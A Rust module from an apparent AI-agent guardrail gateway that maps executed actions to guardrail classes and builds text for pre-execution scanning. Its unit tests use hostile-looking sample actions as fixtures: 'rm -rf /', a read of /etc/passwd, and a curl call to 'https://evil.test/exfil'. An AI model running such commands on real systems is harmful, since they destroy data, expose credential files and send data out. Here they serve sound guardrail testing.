//! Binds an executed managed action to the guardrail engine's managed-action
//! model (issue #200).
//!
//! `ferrogate-guardrails` is deliberately runtime-agnostic — it knows nothing
//! about `ferrogate_runtime::ManagedExternalAction`. This module owns the
//! translation the other way: it derives the guardrail [`ManagedActionClass`],
//! the canonical target string, and the scannable input text from a runtime
//! action, so the gateway seams can build a [`ManagedActionContext`] and a
//! managed-action [`GuardrailEnvelope`] without leaking runtime types into the
//! guardrail crate. The class mapping goes through the runtime's own
//! [`ManagedExternalAction::capability_action`], keeping a single source of
//! truth for the action taxonomy.

use ferrogate_guardrails::{ManagedActionClass, ManagedActionContext};
use ferrogate_runtime::{CapabilityAction, ManagedExternalAction};

/// The guardrail-facing view of a managed action: its class, canonical target,
/// and the text a managed-action guardrail policy scans on the input side.
///
/// The caller holds this so a borrowed [`ManagedActionContext`] and the
/// input envelope can reference its owned strings.
pub(super) struct ManagedActionGuardrailBinding {
    pub(super) class: ManagedActionClass,
    pub(super) target: String,
    pub(super) input_text: String,
}

impl ManagedActionGuardrailBinding {
    /// Derive the guardrail binding for a runtime managed action.
    pub(super) fn from_action(action: &ManagedExternalAction) -> Self {
        Self {
            class: managed_action_class(action),
            target: action.target(),
            input_text: managed_action_input_text(action),
        }
    }

    /// The selection context a managed-action guardrail policy is matched
    /// against (see `ManagedActionSelector`).
    pub(super) fn selection_context(&self) -> ManagedActionContext<'_> {
        ManagedActionContext {
            class: self.class,
            target: Some(self.target.as_str()),
        }
    }
}

/// Map a runtime managed action to its guardrail class. Total by construction:
/// it routes through [`ManagedExternalAction::capability_action`], so a new
/// action kind cannot silently fall through — the `CapabilityAction` match must
/// be extended, which the compiler enforces.
fn managed_action_class(action: &ManagedExternalAction) -> ManagedActionClass {
    match action.capability_action() {
        CapabilityAction::Tool => ManagedActionClass::Tool,
        CapabilityAction::McpTool => ManagedActionClass::Mcp,
        CapabilityAction::Cli => ManagedActionClass::Cli,
        CapabilityAction::Skill => ManagedActionClass::Skill,
        CapabilityAction::Filesystem => ManagedActionClass::Filesystem,
        CapabilityAction::Browser => ManagedActionClass::Browser,
        CapabilityAction::Rest => ManagedActionClass::Rest,
        CapabilityAction::Secret => ManagedActionClass::Secret,
        CapabilityAction::MemoryRead | CapabilityAction::MemoryWrite => ManagedActionClass::Memory,
        CapabilityAction::NetworkEgress => ManagedActionClass::Network,
    }
}

/// The scannable input text for a managed action's *pre-execution* guardrail.
///
/// Always starts with the canonical target (which already carries the tool /
/// server / path / host / method+url identity, and for secrets an opaque
/// fingerprint rather than the raw id). Actions whose real payload is inline —
/// MCP tool arguments and CLI argv — append it so detectors can inspect the
/// actual request, not just its addressing. Actions whose payload is governed
/// by a `*_policy` reference (and therefore not present at this seam) contribute
/// their target only; the richer payload is scanned at the tool-dispatch seam.
fn managed_action_input_text(action: &ManagedExternalAction) -> String {
    let mut text = action.target();
    match action {
        ManagedExternalAction::McpTool(mcp) if !mcp.arguments.is_null() => {
            text.push('\n');
            text.push_str(&mcp.arguments.to_string());
        }
        ManagedExternalAction::Cli(cli) if !cli.args.is_empty() => {
            text.push('\n');
            text.push_str(&cli.args.join(" "));
        }
        _ => {}
    }
    text
}

#[cfg(test)]
mod tests {
    use super::*;
    use ferrogate_runtime::{
        ManagedBrowserAction, ManagedBrowserOperation, ManagedCliAction, ManagedFilesystemAccess,
        ManagedFilesystemAction, ManagedMcpToolAction, ManagedMemoryAccess, ManagedMemoryAction,
        ManagedNetworkEgressAction, ManagedRestAction, ManagedSecretAction, ManagedSkillAction,
        ManagedToolAction,
    };

    fn mcp_action() -> ManagedExternalAction {
        ManagedExternalAction::McpTool(ManagedMcpToolAction {
            server_name: "github".to_string(),
            tool_name: "create_issue".to_string(),
            arguments_policy: "inline".to_string(),
            arguments: serde_json::json!({"title": "leak SECRET token"}),
        })
    }

    #[test]
    fn class_mapping_is_total_across_every_action_kind() {
        let cases: Vec<(ManagedExternalAction, ManagedActionClass)> = vec![
            (
                ManagedExternalAction::Tool(ManagedToolAction {
                    tool_name: "native.echo".to_string(),
                    arguments_policy: "inline".to_string(),
                }),
                ManagedActionClass::Tool,
            ),
            (mcp_action(), ManagedActionClass::Mcp),
            (
                ManagedExternalAction::Cli(ManagedCliAction {
                    command: "rm".to_string(),
                    args: vec!["-rf".to_string(), "/".to_string()],
                    working_dir: "/w".to_string(),
                    env_policy: "deny".to_string(),
                    timeout_millis: 1,
                    stdout_limit_bytes: 1,
                    stderr_limit_bytes: 1,
                    artifact_capture: false,
                }),
                ManagedActionClass::Cli,
            ),
            (
                ManagedExternalAction::Skill(ManagedSkillAction {
                    skill_id: "summarize".to_string(),
                    declared_capabilities: vec!["net".to_string()],
                }),
                ManagedActionClass::Skill,
            ),
            (
                ManagedExternalAction::Filesystem(ManagedFilesystemAction {
                    path: "/etc/passwd".to_string(),
                    access: ManagedFilesystemAccess::Read,
                    workspace_relative: false,
                }),
                ManagedActionClass::Filesystem,
            ),
            (
                ManagedExternalAction::Browser(ManagedBrowserAction {
                    operation: ManagedBrowserOperation::Navigate,
                    url: "https://x.test".to_string(),
                    timeout_millis: 1,
                }),
                ManagedActionClass::Browser,
            ),
            (
                ManagedExternalAction::Rest(ManagedRestAction {
                    method: "POST".to_string(),
                    url: "https://api.test/v1".to_string(),
                    headers_policy: "deny".to_string(),
                    body_policy: "inline".to_string(),
                    timeout_millis: 1,
                    retry_limit: 0,
                    resolved_ips: Vec::new(),
                    redirect_chain: Vec::new(),
                }),
                ManagedActionClass::Rest,
            ),
            (
                ManagedExternalAction::Secret(ManagedSecretAction {
                    secret_id: "openai_api_key".to_string(),
                    purpose: "call".to_string(),
                }),
                ManagedActionClass::Secret,
            ),
            (
                ManagedExternalAction::Memory(ManagedMemoryAction {
                    access: ManagedMemoryAccess::Read,
                    namespace: "n".to_string(),
                    key: "k".to_string(),
                }),
                ManagedActionClass::Memory,
            ),
            (
                ManagedExternalAction::Memory(ManagedMemoryAction {
                    access: ManagedMemoryAccess::Write,
                    namespace: "n".to_string(),
                    key: "k".to_string(),
                }),
                ManagedActionClass::Memory,
            ),
            (
                ManagedExternalAction::NetworkEgress(ManagedNetworkEgressAction {
                    host: "evil.test".to_string(),
                    port: 443,
                    protocol: "https".to_string(),
                    resolved_ips: Vec::new(),
                }),
                ManagedActionClass::Network,
            ),
        ];
        for (action, expected) in cases {
            assert_eq!(
                managed_action_class(&action),
                expected,
                "class mapping mismatch for {action:?}"
            );
        }
    }

    #[test]
    fn mcp_binding_carries_canonical_target_and_inline_arguments() {
        let action = mcp_action();
        let binding = ManagedActionGuardrailBinding::from_action(&action);
        assert_eq!(binding.class, ManagedActionClass::Mcp);
        assert_eq!(binding.target, "mcp:github:create_issue");
        // The selection context targets the canonical string a policy author
        // writes in `managed_action.targets`.
        assert_eq!(
            binding.selection_context().target,
            Some("mcp:github:create_issue")
        );
        // Inline MCP arguments are scannable so a detector can catch the payload.
        assert!(binding.input_text.contains("mcp:github:create_issue"));
        assert!(binding.input_text.contains("leak SECRET token"));
    }

    #[test]
    fn cli_binding_appends_argv_to_input_text() {
        let action = ManagedExternalAction::Cli(ManagedCliAction {
            command: "curl".to_string(),
            args: vec!["https://evil.test/exfil".to_string()],
            working_dir: "/w".to_string(),
            env_policy: "deny".to_string(),
            timeout_millis: 1,
            stdout_limit_bytes: 1,
            stderr_limit_bytes: 1,
            artifact_capture: false,
        });
        let binding = ManagedActionGuardrailBinding::from_action(&action);
        assert_eq!(binding.class, ManagedActionClass::Cli);
        assert_eq!(binding.target, "curl");
        assert!(binding.input_text.contains("https://evil.test/exfil"));
    }

    #[test]
    fn secret_binding_never_leaks_the_raw_secret_id() {
        let action = ManagedExternalAction::Secret(ManagedSecretAction {
            secret_id: "openai_api_key".to_string(),
            purpose: "call".to_string(),
        });
        let binding = ManagedActionGuardrailBinding::from_action(&action);
        assert_eq!(binding.class, ManagedActionClass::Secret);
        assert!(binding.target.starts_with("secret:"));
        // The opaque fingerprint must not expose the raw secret identifier.
        assert!(!binding.input_text.contains("openai_api_key"));
    }
}
